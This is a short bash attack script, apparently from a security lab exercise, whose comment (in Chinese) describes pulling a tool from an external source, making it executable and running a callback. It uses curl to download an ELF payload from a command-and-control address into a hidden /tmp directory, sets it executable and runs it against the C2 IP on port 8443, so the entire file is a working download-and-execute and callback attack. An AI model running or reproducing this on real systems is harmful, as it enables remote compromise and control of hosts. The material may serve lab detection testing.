#!/usr/bin/env bash
# attack（窗口内）：从外部源拉取工具 → chmod → 执行回连。
set -euo pipefail
C2_IP="${SECLAB_C2_IP:-198.51.100.50}"
curl -sf --max-time 10 -o /tmp/.cache/ingress/payload.elf "http://$C2_IP:18085/tool.elf"
chmod 700 /tmp/.cache/ingress/payload.elf
/tmp/.cache/ingress/payload.elf "$C2_IP" 8443
